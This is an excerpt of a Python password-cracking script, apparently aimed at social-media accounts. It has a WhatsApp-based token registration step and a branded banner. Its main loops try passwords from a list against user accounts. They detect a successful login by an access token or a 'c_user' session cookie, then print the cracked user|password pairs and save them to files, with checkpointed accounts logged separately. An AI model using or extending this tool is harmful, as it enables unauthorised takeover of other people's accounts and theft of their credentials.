...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.RtAlamgir6.txt', 'r').read()
    ...
    if to in r:
        ...
        print(' WhatsApp : +8801712034653')
        input('\033[1;97m Press Enter To Send Token')
        os.system('xdg-open https://wa.me/+8801712034653?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+8801712034653?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
    sav = open('/sdcard/Android/.RtAlamgir6.txt', 'w')
    sav.write(id)
    sav.close()
    reg()
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAlamgir-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAlamgir-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( Alamgir Hosen )");time.sleep (0.03)
    print(" [*]. Tysm To My All Frendz. (Alamgir Hosen)");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
    print(" [*]. WP             +8801712034653      ");time.sleep (0.03)
    print(" [*]. This Tool was made in Alamgir Hosen              ");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] A N O N Y M O U S  A L A M G I R  ( Alamgir )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-Alamgir] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [OK-Alamgir] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
